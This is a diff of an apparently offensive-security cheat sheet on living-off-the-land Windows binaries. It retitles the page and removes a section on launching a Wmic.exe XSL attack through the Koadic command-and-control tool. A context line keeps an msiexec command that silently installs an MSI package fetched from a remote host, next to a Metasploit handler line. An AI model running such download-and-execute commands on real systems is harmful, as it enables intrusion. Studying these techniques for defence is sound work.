@@ -1,4 +1,4 @@
-# LOL Binaries
+# 🔧 LOL Binaries
 
 
 
@@ -186,20 +186,6 @@ msf exploit(multi/handler) > exploit
 ```
 msiexec /q /i http://192.168.1.109/1.msi
 ```
-
-## Wmic.exe
-
-The WMIC utility is a Microsoft tool provides a WMI command-line interface that is used for a variety of administrative functions for local and remote machine and also used to wmic query such as system settings, stop processes and execute scripts locally or remotely. Therefore, it can invoke **XSL script** (eXtensible Stylesheet Language).
-
-**Launch Wmic.exe attack via Koadic**
-
-Now will generate a malicious XSL file with the help of koadic which is a Command & Control tool which is quite similar to Metasploit and Powershell Empire
-
-
-
-
-
-
 
 
 
